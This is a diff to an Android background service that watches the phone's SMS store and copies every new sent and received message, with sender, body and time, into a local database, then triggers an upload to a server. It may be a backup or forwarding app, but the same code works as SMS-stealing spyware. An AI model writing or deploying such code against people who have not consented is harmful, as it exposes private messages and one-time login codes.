@@ -29,13 +29,74 @@ public class SMSBackgroundService extends Service {
     private Timer timer;
     private Handler handler;
 
+    private SMSObserver smsObserver;
+
     @Override
     public void onCreate() {
         super.onCreate();
         dbHelper = new SMSDatabaseHelper(this);
         handler = new Handler();
+        
+        smsObserver = new SMSObserver(handler);
+        getContentResolver().registerContentObserver(
+                Uri.parse("content://sms"),
+                true,
+                smsObserver
+        );
+
         startForegroundService();
         startSyncTask();
+    }
+
+    private class SMSObserver extends android.database.ContentObserver {
+        public SMSObserver(Handler handler) {
+            super(handler);
+        }
+
+        @Override
+        public void onChange(boolean selfChange) {
+            super.onChange(selfChange);
+            Log.d("SMSBackgroundService", "SMS database changed, check for new messages...");
+            processNewMessages();
+        }
+    }
+
+    private void processNewMessages() {
+        new Thread(() -> {
+            DeviceAuthManager authManager = new DeviceAuthManager(this);
+            long lastSync = authManager.getLastSyncTimestamp();
+            
+            Uri uri = Uri.parse("content://sms/");
+            String selection = "date > ?";
+            String[] selectionArgs = new String[]{String.valueOf(lastSync)};
+            
+            Cursor cursor = getContentResolver().query(uri, null, selection, selectionArgs, "date ASC");
+            long maxTs = lastSync;
+
+            if (cursor != null) {
+                while (cursor.moveToNext()) {
+                    String sender = cursor.getString(cursor.getColumnIndexOrThrow("address"));
+                    String message = cursor.getString(cursor.getColumnIndexOrThrow("body"));
+                    long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
+                    int typeInt = cursor.getInt(cursor.getColumnIndexOrThrow("type"));
+                    
+                    String type = (typeInt == 1) ? "received" : "sent";
+                    String formattedTimestamp = DateFormat.format("yyyy-MM-dd HH:mm:ss", date).toString();
+
+                    dbHelper.insertSMS(sender, message, formattedTimestamp, type);
+                    if (date > maxTs) {
+                        maxTs = date;
+                    }
+                }
+                cursor.close();
+            }
+
+            if (maxTs > lastSync) {
+                authManager.setLastSyncTimestamp(maxTs);
+                Log.d("SMSBackgroundService", "New messages found, triggering sync.");
+                new SendSMSTask(this).execute();
+            }
+        }).start();
     }
 
     private void startForegroundService() {
@@ -71,43 +132,8 @@ public class SMSBackgroundService extends Service {
     }
 
     private void readAndSendSMS() {
-        Uri uri = Uri.parse("content://sms/inbox");
-        Cursor cursor = getContentResolver().query(uri, null, null, null, "date DESC LIMIT 10");
-
-        if (cursor != null) {
-            JSONArray smsArray = new JSONArray();
-
-            while (cursor.moveToNext()) {
-                String sender = cursor.getString(cursor.getColumnIndexOrThrow("address"));
-                String message = cursor.getString(cursor.getColumnIndexOrThrow("body"));
-                String timestamp = cursor.getString(cursor.getColumnIndexOrThrow("date"));
-                String formattedTimestamp = DateFormat.format("yyyy-MM-dd HH:mm:ss", Long.parseLong(timestamp)).toString();
-                String type = "received";
-
-                JSONObject smsObject = new JSONObject();
-                try {
-                    smsObject.put("sender", sender);
-                    smsObject.put("message", message);
-                    smsObject.put("timestamp", formattedTimestamp);
-                    smsObject.put("type", type);
-                    smsArray.put(smsObject);
-                } catch (JSONException e) {
-                    e.printStackTrace();
-                }
-            }
-            cursor.close();
-
-            if (smsArray.length() > 0 && NetworkUtil.isOnline(this)) {
-                new Thread(() -> {
-                    SendSMSTask sendTask = new SendSMSTask(this);
-                    if (sendTask.sendDataToServer(smsArray)) {
-                        Log.d("SMS", "Messages sent successfully.");
-                    } else {
-                        Log.e("SMS", "Failed to send messages.");
-                    }
-                }).start();
-            }
-        }
+        Log.d("SMSBackgroundService", "Triggering background sync...");
+        new SendSMSTask(this).execute();
     }
 
     @Override
@@ -120,6 +146,9 @@ public class SMSBackgroundService extends Service {
         super.onDestroy();
         if (timer != null) {
             timer.cancel();
+        }
+        if (smsObserver != null) {
+            getContentResolver().unregisterContentObserver(smsObserver);
         }
     }
 
